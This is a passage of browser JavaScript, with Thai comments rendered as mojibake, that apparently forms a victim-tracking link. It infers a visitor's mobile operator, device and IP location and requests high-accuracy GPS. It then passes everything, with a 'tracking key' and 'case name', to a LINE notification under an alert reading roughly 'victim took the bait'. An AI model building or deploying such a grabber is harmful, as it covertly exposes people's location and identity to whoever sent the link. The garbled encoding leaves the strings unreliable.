        return { ip: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ" };
      }
    }
  }
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°: ‡πÅ‡∏õ‡∏•‡∏á‡∏£‡∏´‡∏±‡∏™‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®‡πÄ‡∏õ‡πá‡∏ô‡∏ä‡∏∑‡πà‡∏≠‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®
function getCountryNameFromCode(countryCode) {
  if (!countryCode) return null;
  
  const countries = {
    "TH": "‡πÑ‡∏ó‡∏¢",
    "US": "‡∏™‡∏´‡∏£‡∏±‡∏ê‡∏≠‡πÄ‡∏°‡∏£‡∏¥‡∏Å‡∏≤",
    "UK": "‡∏™‡∏´‡∏£‡∏≤‡∏ä‡∏≠‡∏≤‡∏ì‡∏≤‡∏à‡∏±‡∏Å‡∏£",
    "GB": "‡∏™‡∏´‡∏£‡∏≤‡∏ä‡∏≠‡∏≤‡∏ì‡∏≤‡∏à‡∏±‡∏Å‡∏£",
    "JP": "‡∏ç‡∏µ‡πà‡∏õ‡∏∏‡πà‡∏ô",
    "CN": "‡∏à‡∏µ‡∏ô",
    "SG": "‡∏™‡∏¥‡∏á‡∏Ñ‡πÇ‡∏õ‡∏£‡πå",
    "MY": "‡∏°‡∏≤‡πÄ‡∏•‡πÄ‡∏ã‡∏µ‡∏¢",
    "KR": "‡πÄ‡∏Å‡∏≤‡∏´‡∏•‡∏µ‡πÉ‡∏ï‡πâ",
    "TW": "‡πÑ‡∏ï‡πâ‡∏´‡∏ß‡∏±‡∏ô",
    "HK": "‡∏Æ‡πà‡∏≠‡∏á‡∏Å‡∏á",
    "LA": "‡∏•‡∏≤‡∏ß",
    "VN": "‡πÄ‡∏ß‡∏µ‡∏¢‡∏î‡∏ô‡∏≤‡∏°",
    "KH": "‡∏Å‡∏±‡∏°‡∏û‡∏π‡∏ä‡∏≤",
    "MM": "‡∏û‡∏°‡πà‡∏≤",
    "PH": "‡∏ü‡∏¥‡∏•‡∏¥‡∏õ‡∏õ‡∏¥‡∏ô‡∏™‡πå",
    "ID": "‡∏≠‡∏¥‡∏ô‡πÇ‡∏î‡∏ô‡∏µ‡πÄ‡∏ã‡∏µ‡∏¢",
    "AU": "‡∏≠‡∏≠‡∏™‡πÄ‡∏ï‡∏£‡πÄ‡∏•‡∏µ‡∏¢",
    "NZ": "‡∏ô‡∏¥‡∏ß‡∏ã‡∏µ‡πÅ‡∏•‡∏ô‡∏î‡πå",
    "DE": "‡πÄ‡∏¢‡∏≠‡∏£‡∏°‡∏ô‡∏µ",
    "FR": "‡∏ù‡∏£‡∏±‡πà‡∏á‡πÄ‡∏®‡∏™",
    "IT": "‡∏≠‡∏¥‡∏ï‡∏≤‡∏•‡∏µ",
    "ES": "‡∏™‡πÄ‡∏õ‡∏ô",
    "PT": "‡πÇ‡∏õ‡∏£‡∏ï‡∏∏‡πÄ‡∏Å‡∏™",
    "NL": "‡πÄ‡∏ô‡πÄ‡∏ò‡∏≠‡∏£‡πå‡πÅ‡∏•‡∏ô‡∏î‡πå",
    "BE": "‡πÄ‡∏ö‡∏•‡πÄ‡∏¢‡∏µ‡∏¢‡∏°",
    "CH": "‡∏™‡∏ß‡∏¥‡∏ï‡πÄ‡∏ã‡∏≠‡∏£‡πå‡πÅ‡∏•‡∏ô‡∏î‡πå",
    "AT": "‡∏≠‡∏≠‡∏™‡πÄ‡∏ï‡∏£‡∏µ‡∏¢",
    "SE": "‡∏™‡∏ß‡∏µ‡πÄ‡∏î‡∏ô",
    "NO": "‡∏ô‡∏≠‡∏£‡πå‡πÄ‡∏ß‡∏¢‡πå",
    "DK": "‡πÄ‡∏î‡∏ô‡∏°‡∏≤‡∏£‡πå‡∏Å",
    "FI": "‡∏ü‡∏¥‡∏ô‡πÅ‡∏•‡∏ô‡∏î‡πå",
    "RU": "‡∏£‡∏±‡∏™‡πÄ‡∏ã‡∏µ‡∏¢",
    "CA": "‡πÅ‡∏Ñ‡∏ô‡∏≤‡∏î‡∏≤",
    "MX": "‡πÄ‡∏°‡πá‡∏Å‡∏ã‡∏¥‡πÇ‡∏Å",
    "BR": "‡∏ö‡∏£‡∏≤‡∏ã‡∏¥‡∏•",
    "AR": "‡∏≠‡∏≤‡∏£‡πå‡πÄ‡∏à‡∏ô‡∏ï‡∏¥‡∏ô‡∏≤",
    "ZA": "‡πÅ‡∏≠‡∏ü‡∏£‡∏¥‡∏Å‡∏≤‡πÉ‡∏ï‡πâ",
    "EG": "‡∏≠‡∏µ‡∏¢‡∏¥‡∏õ‡∏ï‡πå",
    "IN": "‡∏≠‡∏¥‡∏ô‡πÄ‡∏î‡∏µ‡∏¢",
    "PK": "‡∏õ‡∏≤‡∏Å‡∏µ‡∏™‡∏ñ‡∏≤‡∏ô"
  };
  
  return countries[countryCode] || null;
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ó‡∏µ‡πà‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏Å‡∏≤‡∏£‡πÄ‡∏ö‡∏≠‡∏£‡πå‡πÇ‡∏ó‡∏£‡∏®‡∏±‡∏û‡∏ó‡πå (‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏à‡∏≥‡∏Å‡∏±‡∏î)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
    possibleOperator: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
    countryCode: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
    remarks: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÄ‡∏ö‡∏≠‡∏£‡πå‡πÇ‡∏ó‡∏£‡∏®‡∏±‡∏û‡∏ó‡πå‡πÇ‡∏î‡∏¢‡∏ï‡∏£‡∏á‡πÄ‡∏ô‡∏∑‡πà‡∏≠‡∏á‡∏à‡∏≤‡∏Å‡∏Ç‡πâ‡∏≠‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏õ‡πá‡∏ô‡∏™‡πà‡∏ß‡∏ô‡∏ï‡∏±‡∏ß‡∏Ç‡∏≠‡∏á‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå"
  };

  try {
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡πÇ‡∏ó‡∏£‡∏®‡∏±‡∏û‡∏ó‡πå‡∏à‡∏≤‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• IP
    const ipDetails = await getIPDetails();
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®‡πÑ‡∏ó‡∏¢‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
    const isThailand = ipDetails.country === "TH" || 
                       ipDetails.countryName === "‡πÑ‡∏ó‡∏¢" || 
                       ipDetails.countryName === "Thailand";
    
    // ‡∏ï‡∏±‡πâ‡∏á‡∏£‡∏´‡∏±‡∏™‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country;
      
      // ‡∏ñ‡πâ‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®‡πÑ‡∏ó‡∏¢‡πÉ‡∏´‡πâ‡∏£‡∏∞‡∏ö‡∏∏‡∏£‡∏´‡∏±‡∏™‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®
      if (isThailand) {
        phoneInfo.countryCode = "+66";
      }
    }
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡∏à‡∏≤‡∏Å isp/org
    const ispInfo = (ipDetails.isp || "").toLowerCase();
    const orgInfo = (ipDetails.org || "").toLowerCase();
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡πÉ‡∏ô‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®‡πÑ‡∏ó‡∏¢‡∏à‡∏≤‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• ISP (‡∏°‡∏µ‡∏£‡∏≤‡∏¢‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏°‡∏≤‡∏Å‡∏Ç‡∏∂‡πâ‡∏ô)
    const thaiOperators = {
      "AIS": [
        "ais", "advanced info service", "awn", "advanced wireless network", 
        "intouch", "shinawatra", "advanc", "advanced"
      ],
      "DTAC": [
        "dtac", "total access communication", "dtn", "dtac trinet", 
        "telenor", "dtc", "tat"
      ],
      "TRUE": [
        "true", "true move", "truemove", "true corporation", "trueonline", 
        "real future", "real move", "true visions", "truevisions", "cp group"
      ],
      "NT": [
        "cat", "tot", "national telecom", "nt", "cat telecom", 
        "tot public company limited", "communications authority of thailand",
        "telephone organization of thailand"
      ],
      "3BB": [
        "triple t broadband", "3bb", "triple t internet", "three bb", 
        "jasmine", "jas", "jasmine international"
      ],
      "AIS Fibre": [
        "ais fibre", "ais fiber"
      ],
      "TRUE Online": [
        "true online", "true internet", "true leased line"
      ],
      "SINET": [
        "sinet", "solutions internet network", "‡∏™‡∏¥‡πÄ‡∏ô‡πá‡∏ï"
      ],
      "CS LOXINFO": [
        "cs loxinfo", "csloxinfo", "loxinfo", "internet thailand"
      ]
    };
    
    // ‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡∏à‡∏≤‡∏Å‡∏ä‡∏∑‡πà‡∏≠ ISP/org
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.includes(keyword) || orgInfo.includes(keyword))) {
        phoneInfo.possibleOperator = operator;
        
        // ‡∏£‡∏∞‡∏ö‡∏∏‡∏ß‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô ISP/Mobile
        if (['AIS Fibre', '3BB', 'TRUE Online', 'SINET', 'CS LOXINFO'].includes(operator)) {
          phoneInfo.networkType = "‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡∏≠‡∏¥‡∏ô‡πÄ‡∏ó‡∏≠‡∏£‡πå‡πÄ‡∏ô‡πá‡∏ï‡∏ö‡πâ‡∏≤‡∏ô";
        } else {
          phoneInfo.networkType = "‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡πÇ‡∏ó‡∏£‡∏®‡∏±‡∏û‡∏ó‡πå‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠";
        }
        
        break;
      }
    }
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏à‡∏≤‡∏Å Network Information API ‡∏ß‡πà‡∏≤‡πÉ‡∏ä‡πâ‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡πÅ‡∏ö‡∏ö‡πÉ‡∏î
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      if (connection.type === 'cellular') {
        phoneInfo.remarks = "‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏ú‡πà‡∏≤‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠";
        if (phoneInfo.possibleOperator !== "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ") {
          phoneInfo.remarks += " " + phoneInfo.possibleOperator;
        }
        phoneInfo.networkType = "‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠";
      } else if (connection.type === 'wifi') {
        phoneInfo.remarks = "‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏ú‡πà‡∏≤‡∏ô WiFi";
        phoneInfo.networkType = "WiFi";
        
        // ‡∏´‡∏≤‡∏Å‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡∏£‡∏π‡πâ‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡πÅ‡∏•‡∏∞‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡πÑ‡∏ó‡∏¢ ‡∏≠‡∏≤‡∏à‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏Å‡∏≤‡∏£‡∏à‡∏≤‡∏Å‡πÄ‡∏°‡∏∑‡∏≠‡∏á/‡∏†‡∏π‡∏°‡∏¥‡∏†‡∏≤‡∏Ñ
        if (isThailand && phoneInfo.possibleOperator === "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ") {
          // ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏Å‡∏≤‡∏£‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏Å‡∏≤‡∏£‡∏à‡∏≤‡∏Å‡∏û‡∏∑‡πâ‡∏ô‡∏ó‡∏µ‡πà (‡πÉ‡∏ä‡πâ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡πÑ‡∏î‡πâ‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏Å‡∏ß‡πà‡∏≤‡∏ô‡∏µ‡πâ)
          if (ipDetails.city) {
            const city = ipDetails.city.toLowerCase();
            if (city.includes("bang") || city === "bangkok" || city === "‡∏Å‡∏£‡∏∏‡∏á‡πÄ‡∏ó‡∏û") {
              phoneInfo.remarks += " (‡∏Å‡∏£‡∏∏‡∏á‡πÄ‡∏ó‡∏û‡∏Ø - ‡∏°‡∏µ‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡∏´‡∏•‡∏≤‡∏Å‡∏´‡∏•‡∏≤‡∏¢)";
            }
          }
        }
      } else if (connection.type === 'ethernet') {
        phoneInfo.remarks = "‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏ú‡πà‡∏≤‡∏ô‡∏™‡∏≤‡∏¢‡πÅ‡∏•‡∏ô";
        phoneInfo.networkType = "Fixed Line";
      }
    }

    // ‡∏î‡∏π‡∏à‡∏≤‡∏Å‡πÄ‡∏ß‡πá‡∏ö‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö mobile browser ‡∏ó‡∏µ‡πà‡∏≠‡∏≤‡∏à‡∏ö‡πà‡∏á‡∏ö‡∏≠‡∏Å‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡πÑ‡∏î‡πâ
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Android")) {
      // ‡∏™‡∏°‡∏≤‡∏£‡πå‡∏ó‡πÇ‡∏ü‡∏ô Android ‡∏≠‡∏≤‡∏à‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∑‡πà‡∏ô‡πÜ ‡∏ó‡∏µ‡πà‡∏ö‡πà‡∏á‡∏ö‡∏≠‡∏Å‡∏ú‡∏π‡πâ‡πÉ‡∏´‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£
      if (phoneInfo.possibleOperator === "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ") {
        if (userAgent.includes("SM-")) {
          phoneInfo.deviceType = "Samsung";
          // ‡∏™‡∏°‡∏°‡∏∏‡∏ï‡∏¥‡∏ß‡πà‡∏≤ Samsung ‡πÉ‡∏ô‡πÑ‡∏ó‡∏¢‡∏™‡πà‡∏ß‡∏ô‡πÉ‡∏´‡∏ç‡πà‡∏≠‡∏≤‡∏à‡πÉ‡∏ä‡πâ AIS/TRUE
          if (isThailand) {
            phoneInfo.remarks += " (‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå Samsung - ‡πÉ‡∏ô‡πÑ‡∏ó‡∏¢‡∏ô‡∏¥‡∏¢‡∏°‡πÉ‡∏ä‡πâ‡∏Å‡∏±‡∏ö AIS, TRUE)";
          }
        } else if (userAgent.includes("Xiaomi") || userAgent.includes("Redmi")) {
          phoneInfo.deviceType = "Xiaomi";
          // ‡∏™‡∏°‡∏°‡∏∏‡∏ï‡∏¥‡∏ß‡πà‡∏≤ Xiaomi/Redmi ‡πÉ‡∏ô‡πÑ‡∏ó‡∏¢‡∏ö‡∏≤‡∏á‡∏™‡πà‡∏ß‡∏ô‡∏≠‡∏≤‡∏à‡πÉ‡∏ä‡πâ DTAC/TRUE
          if (isThailand) {
            phoneInfo.remarks += " (‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå Xiaomi/Redmi - ‡πÉ‡∏ô‡πÑ‡∏ó‡∏¢‡∏ô‡∏¥‡∏¢‡∏°‡πÉ‡∏ä‡πâ‡∏Å‡∏±‡∏ö TRUE, DTAC)";
          }
        }
      }
    } else if (userAgent.includes("iPhone")) {
      phoneInfo.deviceType = "iPhone";
      // iPhone ‡πÉ‡∏ô‡πÑ‡∏ó‡∏¢‡∏°‡∏±‡∏Å‡πÉ‡∏ä‡πâ AIS/TRUE ‡∏°‡∏≤‡∏Å‡∏Å‡∏ß‡πà‡∏≤ (‡∏™‡∏°‡∏°‡∏∏‡∏ï‡∏¥)
      if (isThailand && phoneInfo.possibleOperator === "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ") {
        phoneInfo.remarks += " (iPhone ‡πÉ‡∏ô‡πÑ‡∏ó‡∏¢‡∏ô‡∏¥‡∏¢‡∏°‡πÉ‡∏ä‡πâ‡∏Å‡∏±‡∏ö AIS, TRUE ‡∏°‡∏≤‡∏Å‡∏Å‡∏ß‡πà‡∏≤)";
      }
    }
    
    // ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏® (‡∏ñ‡πâ‡∏≤‡∏°‡∏µ)
    if (ipDetails.countryName && ipDetails.countryName !== "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö") {
      phoneInfo.country = ipDetails.countryName;
    }

    return phoneInfo;
  } catch (error) {
    console.error("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏Å‡∏≤‡∏£‡πÄ‡∏ö‡∏≠‡∏£‡πå‡πÇ‡∏ó‡∏£‡∏®‡∏±‡∏û‡∏ó‡πå‡πÑ‡∏î‡πâ:", error);
    return phoneInfo;
  }
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á
function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÑ‡∏î‡πâ‡∏£‡∏±‡∏ö‡∏û‡∏¥‡∏Å‡∏±‡∏î
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏µ‡∏Å‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏û‡∏¥‡∏Å‡∏±‡∏î
        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
      },
      function(error) {
        console.log("‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡πÑ‡∏°‡πà‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÉ‡∏´‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á:", error.message);
        // ‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏µ‡∏Å‡∏Ñ‡∏£‡∏±‡πâ‡∏á ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡∏™‡πà‡∏á‡πÑ‡∏õ‡πÅ‡∏•‡πâ‡∏ß‡πÉ‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÅ‡∏£‡∏Å
      },
      {
        timeout: 5000,
        enableHighAccuracy: true
      }
    );
  }
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏à‡πâ‡∏á‡πÄ‡∏ï‡∏∑‡∏≠‡∏ô‡πÅ‡∏ö‡∏ö‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î
function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
  // ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏•‡∏±‡∏Å
  const message = [
    "üé£‡πÅ‡∏à‡πâ‡∏á‡πÄ‡∏ï‡∏∑‡∏≠‡∏ô‡πÄ‡∏´‡∏¢‡∏∑‡πà‡∏≠‡∏Å‡∏¥‡∏ô‡πÄ‡∏ö‡πá‡∏î\n",
    `‚è∞‡πÄ‡∏ß‡∏•‡∏≤: ${timestamp}`,
  ];
  // ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Case Name (‡∏ñ‡πâ‡∏≤‡∏°‡∏µ)
  if (caseName && caseName !== "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤") {
    message.push(`üìÇ‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏Ñ‡∏™: ${caseName}`);
  }
  // ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Tracking Key (‡∏ñ‡πâ‡∏≤‡∏°‡∏µ)
  if (trackingKey && trackingKey !== "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ñ‡πà‡∏≤") {
    message.push(`üîëTracking Key: ${trackingKey}`);
  }
  // --- ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• IP ‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î ---
  message.push(`üåêIP: ${ipData.ip || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•"}`);
  if (ipData.hostname && ipData.hostname !== "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•") {
    message.push(`   - Hostname: ${ipData.hostname}`);
  }
  if (ipData.city && ipData.country) {
    // ‡πÉ‡∏ä‡πâ country code ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ‡∏à‡∏≤‡∏Å ipinfo (e.g., TH)
    message.push(`üìç‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á (IP): ${ipData.city}, ${ipData.region}, ${ipData.country}`);
  }
  if (ipData.loc && ipData.loc !== "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•") {
    message.push(`   - ‡∏û‡∏¥‡∏Å‡∏±‡∏î (IP): ${ipData.loc}`);
  }
  if (ipData.postal && ipData.postal !== "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•") {
    message.push(`   - ‡∏£‡∏´‡∏±‡∏™‡πÑ‡∏õ‡∏£‡∏©‡∏ì‡∏µ‡∏¢‡πå: ${ipData.postal}`);
  }
  if (ipData.org && ipData.org !== "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö") {
    message.push(`üè¢‡∏≠‡∏á‡∏Ñ‡πå‡∏Å‡∏£/ISP: ${ipData.org}`); // ‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• org ‡πÄ‡∏ï‡πá‡∏°‡πÜ
  } else if (ipData.isp && ipData.isp !== "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö") {
    message.push(`üîå‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢: ${ipData.isp}`); // Fallback ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏°‡∏µ org
  }
  if (ipData.timezone && ipData.timezone !== "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö") {
    message.push(`   - Timezone: ${ipData.timezone}`);
  }
  // --- ‡∏à‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• IP ---

  // ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏û‡∏¥‡∏Å‡∏±‡∏î GPS (‡∏ñ‡πâ‡∏≤‡∏°‡∏µ)
  if (location && location !== "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•" && location.lat && location.long) {
    message.push(`üìç‡∏û‡∏¥‡∏Å‡∏±‡∏î GPS: ${location.lat}, ${location.long} (‡πÅ‡∏°‡πà‡∏ô‡∏¢‡∏≥ ¬±${Math.round(location.accuracy)}m)`);
    message.push(`üó∫Ô∏è‡∏•‡∏¥‡∏á‡∏Å‡πå‡πÅ‡∏ú‡∏ô‡∏ó‡∏µ‡πà: ${location.gmapLink}`);
  } else {
    message.push(`üìç‡∏û‡∏¥‡∏Å‡∏±‡∏î GPS: ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ (‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡πÑ‡∏°‡πà‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï)`);
  }

  // ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå
  message.push(`üì±‡∏≠‡∏∏‡∏õ‡∏Å‡∏£‡∏ì‡πå: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
  message.push(`üåê‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå: ${deviceData.browser}`);

